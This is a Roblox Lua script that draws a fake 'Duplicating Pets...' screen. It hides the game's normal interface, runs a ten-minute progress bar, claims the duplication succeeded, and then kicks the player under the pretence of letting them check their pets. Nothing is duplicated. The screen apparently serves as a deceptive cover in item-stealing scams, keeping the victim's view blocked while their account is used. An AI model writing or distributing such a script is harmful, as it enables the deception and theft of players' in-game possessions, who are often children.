local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local playerGui = player:WaitForChild("PlayerGui")

-- Hide all default Roblox UI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
StarterGui:SetCore("TopbarEnabled", false)

-- 💻 Create Loading Screen
local loadingGui = Instance.new("ScreenGui", playerGui)

local loadingBg = Instance.new("ImageLabel", loadingGui)
loadingBg.Size = UDim2.new(1, 0, 1, 0)
loadingBg.Position = UDim2.new(0, 0, 0, 0)
loadingBg.Image = "https://cdn.discordapp.com/attachments/1383825271160836147/1386341525423915120/image.png?ex=68595aa8&is=68580928&hm=f202771ae9da82379a25ca9611a6645db3b89ff671386e6d156bb34241e0924e&"
loadingBg.BackgroundTransparency = 1
loadingBg.ScaleType = Enum.ScaleType.Crop

-- Title
local title = Instance.new("TextLabel", loadingGui)
title.AnchorPoint = Vector2.new(0.5,0)
title.Position = UDim2.new(0.5, 0, 0.45, 0)
title.Size = UDim2.new(0.8, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Duplicating Pets..."
title.TextColor3 = Color3.fromRGB(180, 240, 180)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextTransparency = 1

-- Loading bar elements
local barBg = Instance.new("Frame", loadingGui)
barBg.AnchorPoint = Vector2.new(0.5,0)
barBg.Position = UDim2.new(0.5, 0, 0.5, 30)
barBg.Size = UDim2.new(0, 300, 0, 24)
barBg.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
barBg.BorderSizePixel = 0
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 12)

local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 120)
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 12)

local percent = Instance.new("TextLabel", loadingGui)
percent.AnchorPoint = Vector2.new(0.5,0)
percent.Position = UDim2.new(0.5, 0, 0.5, 60)
percent.Size = UDim2.new(0, 100, 0, 24)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(180, 240, 180)
percent.Font = Enum.Font.GothamBold
percent.TextSize = 18

-- Fade elements in
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0}):Play()
TweenService:Create(barBg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- Animate progress
local duration = 600
local steps = 50

for i = 1, steps do
    local t = i / steps
    barFill.Size = UDim2.new(t, 0, 1, 0)
    percent.Text = math.floor(t * 100) .. "%"
    wait(duration / steps)
end

percent.Text = "100%"
wait(0.5)

-- 🎉 Stylized Success Screen
loadingGui:ClearAllChildren()

local successBg = Instance.new("ImageLabel", loadingGui)
successBg.Size = UDim2.new(1,0,1,0)
successBg.Position = UDim2.new(0,0,0,0)
successBg.Image = loadingBg.Image
successBg.BackgroundTransparency = 1
successBg.ScaleType = Enum.ScaleType.Crop

-- Container
local box = Instance.new("Frame", loadingGui)
box.AnchorPoint = Vector2.new(0.5,0.5)
box.Position = UDim2.new(0.5,0,0.5,0)
box.Size = UDim2.new(0,400,0,220)
box.BackgroundColor3 = Color3.fromRGB(20,60,20)
box.BackgroundTransparency = 1
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 20)

TweenService:Create(box, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()

-- Check icon & titles
local check = Instance.new("TextLabel", box)
check.AnchorPoint = Vector2.new(0.5,0)
check.Position = UDim2.new(0.5,0,0,20)
check.Size = UDim2.new(1,0,0,80)
check.BackgroundTransparency = 1
check.Text = "✅"
check.TextColor3 = Color3.fromRGB(120,255,120)
check.Font = Enum.Font.GothamBlack
check.TextSize = 60
check.TextTransparency = 1
TweenService:Create(check, TweenInfo.new(0.6), {TextTransparency = 0}):Play()

local sTitle = Instance.new("TextLabel", box)
sTitle.AnchorPoint = Vector2.new(0.5,0)
sTitle.Position = UDim2.new(0.5,0,0,110)
sTitle.Size = UDim2.new(1,0,0,30)
sTitle.BackgroundTransparency = 1
sTitle.Text = "Duplication Successful!"
sTitle.TextColor3 = Color3.fromRGB(180,255,180)
sTitle.Font = Enum.Font.GothamBold
sTitle.TextSize = 22
sTitle.TextTransparency = 1
TweenService:Create(sTitle, TweenInfo.new(0.6), {TextTransparency = 0}):Play()

local note = Instance.new("TextLabel", box)
note.AnchorPoint = Vector2.new(0.5,0)
note.Position = UDim2.new(0.5,0,0,145)
note.Size = UDim2.new(0,360,0,24)
note.BackgroundTransparency = 1
note.Text = "Click the button below to rejoin and check your pets."
note.TextColor3 = Color3.fromRGB(150,255,150)
note.Font = Enum.Font.Gotham
note.TextSize = 16
note.TextTransparency = 1
TweenService:Create(note, TweenInfo.new(0.6), {TextTransparency = 0}):Play()

-- 🟢 Rejoin Button
local btn = Instance.new("TextButton", box)
btn.AnchorPoint = Vector2.new(0.5,0)
btn.Position = UDim2.new(0.5,0,0,180)
btn.Size = UDim2.new(0,200,0,40)
btn.Text = "Rejoin Now"
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 18
btn.BackgroundColor3 = Color3.fromRGB(50,200,80)
btn.BackgroundTransparency = 1
Instance.new("UICorner", btn).CornerRadius = UDim.new(0,10)
TweenService:Create(btn, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
btn.MouseEnter:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80,230,120)}):Play()
end)
btn.MouseLeave:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50,200,80)}):Play()
end)

btn.MouseButton1Click:Connect(function()
    player:Kick("Rejoining to check your duplicated pets!")
end)
